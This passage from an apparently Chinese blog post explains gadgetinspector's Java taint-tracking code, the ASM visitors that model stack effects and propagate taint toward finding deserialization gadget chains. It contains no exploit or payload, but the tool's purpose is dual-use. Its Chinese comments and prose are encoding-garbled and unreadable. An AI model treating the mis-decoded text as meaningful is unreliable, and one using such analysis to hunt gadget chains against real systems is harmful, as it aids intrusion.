&#123;</span><br><span class="line">                            <span class="comment">// å­—æ®µå¦‚æœæ˜¯ç¬æ€çš„ è™½ç„¶ä¹Ÿéœ€è¦ä»æ ˆä¸Šå–å¯¹è±¡çš„å¼•ç”¨ ä½†å¹¶ä¸ä¼šäº§ç”Ÿæ±¡ç‚¹ åªéœ€è®¾ç½®ä¸€ä¸ªç©ºé›†åˆå³å¯</span></span><br><span class="line">                            <span class="comment">// æˆ–è€…è¯´ æ±¡ç‚¹ä¼ æ’­é“¾è¢«ä¸­æ–­äº†</span></span><br><span class="line">                            taint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// æ¨¡æ‹Ÿå †æ ˆå˜åŒ–</span></span><br><span class="line">                        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">// å–å€¼å®Œæˆåè¦å°†å€¼é‡æ–°å‹å…¥åˆ°æ ˆä¸­ ä»¥ä¾¿ç»§ç»­ä½¿ç”¨ å³æ±¡ç‚¹è¢«å‹æ ˆäº†</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// putField ä¸ ä¸¤ä¸ªæ§½æ•°æ®çš„getField å †æ ˆå˜åŒ–æ”¾åˆ°è¿™é‡Œäº†</span></span><br><span class="line">            <span class="comment">// åªä¼šå¼•èµ·å †æ ˆå˜åŒ–å¹¶ä¸å½±å“æ±¡ç‚¹çš„å˜åŒ–</span></span><br><span class="line">            <span class="comment">// é™æ€æ“ä½œä¸å—æ§åˆ¶ ä¸å½±å“æ±¡ç‚¹ä¼ æ’­</span></span><br><span class="line">            <span class="comment">// putField æ“ä½œå‰æ±¡ç‚¹å€¼å·²ç»å’‹æ ˆä¸Š æ‰§è¡Œå®Œæ¯•åæ”¹å€¼ä¼šè¢«å¼¹å‡ºï¼Œä¸éœ€è¦é¢å¤–è®¾ç½®</span></span><br><span class="line">            <span class="comment">// long å’Œ double ç±»å‹æ•°æ®ä¼ æ’­åˆ°sinkç‚¹ä¹Ÿæ²¡å•¥ä»·å€¼ï¼Œè¿™é‡Œç›´æ¥å¿½ç•¥æ‰äº†</span></span><br><span class="line">            <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>TaintTrackingMethodVisitor çš„æ–¹æ³• visitFieldInsn ä¸»è¦è´Ÿè´£æ¨¡æ‹ŸæŒ‡ä»¤æ‰§è¡Œæ—¶æ ˆå¸§çš„å˜åŒ–  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">typeSize</span> <span class="operator">=</span> Type.getType(desc).getSize();</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            <span class="comment">// ä»classä¸­è¯»æ•°æ® ç„¶åå°†è¯»å–çš„æ•°æ® å‹å…¥æ ˆ</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    push();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// ä»æ ˆä¸Šå¼¹å‡ºæ•°æ® ç„¶åç»™classå¯¹è±¡æŒ‡å®šçš„å˜é‡èµ‹å€¼</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// å–å€¼ä¼š å…ˆä»æ ˆä¸Šå¼¹å‡ºå¯¹è±¡çš„å¼•ç”¨ ç„¶åå°†å–å‡ºçš„å­—æ®µå‹å…¥æ ˆä¸­</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                pop();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    push();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// å…ˆä»æ ˆä¸Šå°†æ•°æ®å¼¹å‡ºæ¥ ç„¶åå¼¹å‡ºè¦è¢«èµ‹å€¼çš„å¯¹è±¡çš„å¼•ç”¨ æœ€åè¿›è¡Œèµ‹å€¼</span></span><br><span class="line">            <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeSize; i++) &#123;</span><br><span class="line">                    pop();</span><br><span class="line">                &#125;</span><br><span class="line">                pop();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">        sanityCheck();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å½“å‡ºç°æ–¹æ³•è°ƒç”¨æ—¶ä¼šè°ƒç”¨ visitMethodInsn æ–¹æ³•   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">            <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123; <span class="comment">// å¤„ç†å®ä¾‹æ–¹æ³•è°ƒç”¨çš„ thisï¼Œå°† this åŠ å…¥åˆ°å‚æ•°åˆ—è¡¨ä¸­</span></span><br><span class="line">                Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">                System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">                extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">                argTypes = extendedArgTypes;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¿”å›å€¼å¤§å°</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> Type.getReturnType(desc).getSize();</span><br><span class="line"></span><br><span class="line">            Set&lt;Integer&gt; resultTaint;</span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                    <span class="comment">// åˆå§‹åŒ– å‚æ•°æ±¡ç‚¹åˆ—è¡¨</span></span><br><span class="line">                    <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        argTaint.add(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">// è°ƒç”¨æ–¹æ³•å‰ æ–¹æ³•çš„å‚æ•°éƒ½ä¼šè¢«å…ˆå‹åˆ°æ ˆä¸Š æ‰€ä»¥è¿™é‡Œå…ˆä»æ ˆä¸Šå°†æ±¡ç‚¹å–å‡ºæ¥</span></span><br><span class="line">                    <span class="comment">// ä»è¿™é‡Œå¯ä»¥çœ‹å‡º  å‚æ•°æ˜¯ä»å³å¾€å·¦å‹æ ˆçš„</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                        <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                        stackIndex += argType.getSize();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// æ„é€ æ–¹æ³•å°†è¢«ç¬¬ä¸€ä¸ªå‚æ•°æ±¡æŸ“</span></span><br><span class="line">                    <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                        <span class="comment">// parameters</span></span><br><span class="line">                        resultTaint = argTaint.get(<span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å½“å‰æ–¹æ³•æ˜¯å¦å·²ç»è¢«åˆ†æè¿‡äº† å‚æ•°ä¸è¿”å›å€¼çš„ä¼ æ’­å…³ç³»</span></span><br><span class="line">                    Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">                    <span class="comment">// å¦‚æœå·²ç»è¢«åˆ†æè¿‡äº† ç›´æ¥è·å–å·²æœ‰çš„ç»“æœ</span></span><br><span class="line">                    <span class="keyword">if</span> (passthrough != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å¦‚æœæ²¡æœ‰åˆ†æè¿‡ é‚£å°±æ˜¯å‰é¢çš„æ–¹æ³•è°ƒç”¨æ‹“æ‰‘æ’åºå­˜åœ¨å¼‚å¸¸ï¼Œè¿™ç§æƒ…å†µåŸºæœ¬ä¸å¯èƒ½å‡ºç°</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å¤„ç†æ–¹æ³•è°ƒç”¨è¿‡ç¨‹ä¸­çš„æ“ä½œæ•°æ ˆå˜åŒ–</span></span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨è¿”å›å€¼</span></span><br><span class="line">            <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// è¡¥å……è€Œä¸æ˜¯è®¾ç½® å› ä¸ºæ—¶é›†åˆçš„ç¼˜æ•…ï¼Œé‡å¤çš„å€¼ä¼šè¢«å‰”é™¤æ‰</span></span><br><span class="line">                getStackTaint(retSize-<span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†æ–¹æ³•è°ƒç”¨è¿‡ç¨‹ä¸­çš„æ“ä½œæ•°æ ˆå˜åŒ–  åŒæ—¶è¿›è¡Œæ±¡ç‚¹è·Ÿè¸ª ä¸ PassthroughDataflowMethodVisitor çš„ visitMethodInsn æœ‰é‡å¤çš„é€»è¾‘ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> MethodReference.<span class="type">Handle</span> <span class="variable">methodHandle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc);</span><br><span class="line"></span><br><span class="line">        Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">        <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">            Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">            System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">            extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">            argTypes = extendedArgTypes;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Type</span> <span class="variable">returnType</span> <span class="operator">=</span> Type.getReturnType(desc);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> returnType.getSize();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                <span class="comment">// å®šä¹‰å‚æ•°åˆ—è¡¨</span></span><br><span class="line">                <span class="keyword">final</span> List&lt;Set&lt;T&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;T&gt;&gt;(argTypes.length);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                    argTaint.add(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// æ–¹æ³•è°ƒç”¨å®Œåä¼šæ¢å¤æ ˆå¸§ï¼Œå°†æ–¹æ³•çš„å‚æ•°å¼¹å‡ºæ ˆ</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                    <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// å ä¸¤ä¸ªæ§½çš„ æ•°æ®éœ€è¦å…ˆå¼¹ä¸€æ¬¡ å› ä¸ºæ±¡ç‚¹æ•°æ®å­˜å‚¨åœ¨æ›´ä¸‹å±‚çš„æ§½ä½ä¸­ </span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; argType.getSize() - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                            pop();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å°†æ ˆä¸Šçš„æ±¡ç‚¹å‹å…¥è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°æ±¡ç‚¹åˆ—è¡¨ä¸­</span></span><br><span class="line">                        argTaint.set(argTypes.length - <span class="number">1</span> - i, pop());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Set&lt;T&gt; resultTaint;</span><br><span class="line">                <span class="comment">// æ„é€ æ–¹æ³•çš„è¿”å›å€¼ä¼šè¢«ç¬¬ä¸€ä¸ªå‚æ•°æ±¡æŸ“</span></span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                    <span class="comment">// parameters</span></span><br><span class="line">                    resultTaint = argTaint.get(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// If calling defaultReadObject on a tainted ObjectInputStream, that taint passes to &quot;this&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (owner.equals(<span class="string">&quot;java/io/ObjectInputStream&quot;</span>) &amp;&amp; name.equals(<span class="string">&quot;defaultReadObject&quot;</span>) &amp;&amp; desc.equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    savedVariableState.localVars.get(<span class="number">0</span>).addAll(argTaint.get(<span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å·²çŸ¥çš„ä¸€äº›é¢„å®šä¹‰çš„æ±¡æŸ“å…³ç³»</span></span><br><span class="line">                <span class="keyword">for</span> (Object[] passthrough : PASSTHROUGH_DATAFLOW) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (passthrough[<span class="number">0</span>].equals(owner) &amp;&amp; passthrough[<span class="number">1</span>].equals(name) &amp;&amp; passthrough[<span class="number">2</span>].equals(desc)) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; passthrough.length; i++) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get((Integer)passthrough[i]));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¦‚æœå­˜åœ¨å·²åˆ†æçš„ä¼ æ’­æµæ•°æ®</span></span><br><span class="line">                <span class="keyword">if</span> (passthroughDataflow != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// å°è¯•ä»å…¶ä¸­å–å‡ºå½“å‰æ–¹æ³•çš„æ±¡ç‚¹ä¼ æ’­æµæ•°æ®</span></span><br><span class="line">                    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">                    <span class="comment">// å¦‚æœå½“å‰æ–¹æ³•çš„æ±¡ç‚¹ä¼ æ’­æµå·²ç»è¢«åˆ†æè¿‡äº†</span></span><br><span class="line">                    <span class="keyword">if</span> (passthroughArgs != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// éå†å¾—åˆ°å½“å‰æ–¹æ³•ä¼šè¢«å“ªäº›å‚æ•°æ±¡æŸ“</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">                            <span class="comment">// ä»å…¥å‚ä¸­å–å‡ºå¯¹åº”ä½ç½®çš„æ±¡ç‚¹ æ”¾åˆ° resultTaint ä¸­ resultTaint è¡¨ç¤ºå½“å‰æ–¹æ³•çš„è¿”å›å€¼ä¼šè¢«å“ªä¸ªå…¥å‚æ±¡æŸ“</span></span><br><span class="line">                            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Heuristic; if the object implements java.util.Collection or java.util.Map, assume any method accepting an object</span></span><br><span class="line">                <span class="comment">// taints the collection. Assume that any method returning an object returns the taint of the collection.</span></span><br><span class="line">                <span class="comment">// å¦‚æœä¸æ˜¯é™æ€æ–¹æ³•è°ƒç”¨ ä¸”ç¬¬ä¸€ä¸ªå‚æ•°éåŸºæœ¬æ•°æ®ç±»å‹</span></span><br><span class="line">                <span class="comment">// é’ˆå¯¹é›†åˆä»¥åŠæ˜ å°„åšçš„ç‰¹æ®Šå¤„ç†</span></span><br><span class="line">                <span class="comment">// å‡è®¾ä»»æ„æ¥å—å¯¹è±¡çš„æ–¹æ³•å‡ä¼šæ±¡æŸ“é›†åˆ å‡è®¾ä»»æ„è¿”å›å¯¹è±¡çš„æ–¹æ³•éƒ½ä¼šè¿”å›é›†åˆçš„æ±¡ç‚¹</span></span><br><span class="line">                <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC &amp;&amp; argTypes[<span class="number">0</span>].getSort() == Type.OBJECT) &#123;</span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.getSuperClasses(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(argTypes[<span class="number">0</span>].getClassName().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)));</span><br><span class="line">                    <span class="keyword">if</span> (parents != <span class="literal">null</span> &amp;&amp; (parents.contains(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/util/Collection&quot;</span>)) ||</span><br><span class="line">                            parents.contains(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/util/Map&quot;</span>)))) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; argTaint.size(); i++) &#123;</span><br><span class="line">                            argTaint.get(<span class="number">0</span>).addAll(argTaint.get(i));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (returnType.getSort() == Type.OBJECT || returnType.getSort() == Type.ARRAY) &#123;</span><br><span class="line">                            resultTaint.addAll(argTaint.get(<span class="number">0</span>));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// æ–¹æ³•è°ƒç”¨å®Œéœ€è¦å¦‚æœéœ€è¦è¿”å›æ•°æ® åˆ™éœ€è¦å…ˆå°†è¿”å›å€¼å‹æ ˆ</span></span><br><span class="line">                <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    push(resultTaint);</span><br><span class="line">                    <span class="comment">// å¦‚æœè¿”å›å€¼å æ®ä¸¤ä¸ªæ§½ä½åˆ™è¿˜è¦å‹ä¸€æ¬¡</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; retSize; i++) &#123;</span><br><span class="line">                        push();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">        sanityCheck();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å½“æ–¹æ³•æ‰§è¡Œå®Œæ¯•éœ€è¦è¿”å›æ—¶ è°ƒç”¨  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">                <span class="comment">// è¿™äº›æŒ‡ä»¤æ“ä½œçš„æ•°æ®åœ¨æ“ä½œæ•°æ ˆä¸Šåªå æ®ä¸€ä¸ªæ§½ä½</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.IRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.FRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.ARETURN:</span><br><span class="line">                    <span class="comment">// ä»æ±¡ç‚¹æ ˆä¸Šå–å‡ºæœ€ä¸Šé¢çš„ä¸€ä¸ªæ•°æ® è®¾ç½®åˆ° returnTaint ä¸­</span></span><br><span class="line">                    <span class="comment">// å¦‚æœæ±¡ç‚¹æ ˆä¸Šçš„æ•°æ®ä¸å½¢å‚å­˜åœ¨å…³è”åˆ™è¯æ˜ è¯¥å‚æ•°å¯ä»¥å½±å“æ–¹æ³•çš„è¿”å›å€¼</span></span><br><span class="line">                    returnTaint.addAll(getStackTaint(<span class="number">0</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// åŒæ ·çš„ è¿™äº›æŒ‡ä»¤å æ®ä¸¤ä¸ªæ§½ä½</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.LRETURN:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.DRETURN:</span><br><span class="line">                    returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// void</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.RETURN:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆæ•°æ®ä¼ æ’­æµå›¾çš„çš„åˆ†æç»“æœå°†è¢«å­˜å‚¨åœ¨å­—æ®µ gadgetinspector.PassthroughDiscovery.passthroughDataflowï¼Œè¯¥å­—æ®µçš„ç­¾åä¸º Map&lt;MethodReference.Handle, Set<Integer>&gt;ï¼Œ<br>å³ä¸€ä¸ªé€šè¿‡æ–¹æ³•åå¥æŸ„ç´¢å¼•ç»“æœçš„ Map æ˜ å°„ï¼ŒMap çš„å€¼ä¸ºä¼šæ±¡æŸ“è¯¥æ–¹æ³•è¿”å›å€¼çš„å½¢å‚ä½ç½®é›†åˆã€‚<br>passthroughDataflow æœ€ç»ˆä¼šè¢«ä¿å­˜åœ¨æ–‡ä»¶ passthrough.dat ä¸­ï¼Œæ•°æ®çš„å­˜å‚¨æ ¼å¼ä¸º<br>æ–¹æ³•æ‰€å±ç±»å…¨ç±»å|æ–¹æ³•å|æ–¹æ³•æè¿°ç¬¦|æ±¡æŸ“çš„å‚æ•°ä½ç½®1,æ±¡æŸ“çš„å‚æ•°ä½ç½®2,æ±¡æŸ“çš„å‚æ•°ä½ç½®3â€¦<br>å¦‚ï¼š<br>javax&#x2F;swing&#x2F;plaf&#x2F;nimbus&#x2F;OptionPanePainter	decodeEllipse1	()Ljava&#x2F;awt&#x2F;geom&#x2F;Ellipse2D;	0,  </p>
